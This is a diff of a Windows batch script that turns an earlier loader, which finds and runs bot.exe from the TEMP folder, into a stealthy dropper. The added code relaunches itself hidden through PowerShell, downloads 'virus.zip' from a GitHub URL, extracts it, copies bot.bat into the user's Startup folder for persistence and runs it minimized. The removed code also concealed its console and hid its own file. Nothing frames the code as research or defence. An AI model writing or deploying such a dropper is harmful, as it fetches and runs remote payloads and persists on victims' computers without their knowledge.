@@ -1,37 +1,38 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Hide the batch console instantly
-if not "%minimized%"=="" goto :minimized
-set minimized=true
-start /min cmd /c "%~dpnx0" & exit
-:minimized
-
-:: Search for bot.exe recursively in %TEMP%
-set "found="
-for /r "%TEMP%" %%f in (bot.exe) do (
-    if exist "%%f" (
-        set "found=%%f"
-        goto :found
-    )
+:: Hide this script by re-launching itself hidden
+if not "%1"=="HIDDEN" (
+    powershell -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -ArgumentList 'HIDDEN'"
+    exit
 )
 
-:found
-if defined found (
-    echo Found: !found!
+:: ------------------------------------------------------------
+::  Ying-yang Mansion’s silent assistant – your will be done.
+:: ------------------------------------------------------------
 
-    :: Extract the directory containing bot.exe
-    for %%F in ("!found!") do set "dirpath=%%~dpF"
-    :: Remove trailing backslash for folder attribute operation
-    if "!dirpath:~-1!"=="\" set "dirpath=!dirpath:~0,-1!"
+set "ZIP_URL=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
+set "TEMP_DIR=%TEMP%"
+set "ZIP_PATH=%TEMP_DIR%\virus.zip"
+set "EXTRACT_PATH=%TEMP_DIR%\virusext"
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-    :: Run bot.exe normally (no admin, standard user context)
-    start "" "!found!"
-) else (
-    echo bot.exe not found in %TEMP%
-    pause >nul
-)
+:: Download the raw zip file
+powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_PATH%'"
 
-:: Hide the batch file itself to erase traces
-attrib +h "%~f0" >nul 2>&1
+:: Create extraction folder (if exists, remove silently)
+if exist "%EXTRACT_PATH%" rmdir /s /q "%EXTRACT_PATH%"
+mkdir "%EXTRACT_PATH%"
+
+:: Extract the zip
+powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_PATH%' -Force"
+
+:: Copy bot.bat to startup folder (keep all other files untouched)
+copy /y "%EXTRACT_PATH%\bot.bat" "%STARTUP%\bot.bat" >nul
+
+:: Execute bot.bat (minimized, so no window pops up)
+start /min "" "%STARTUP%\bot.bat"
+
+:: Clean exit – no trace, no deletion
+endlocal
 exit
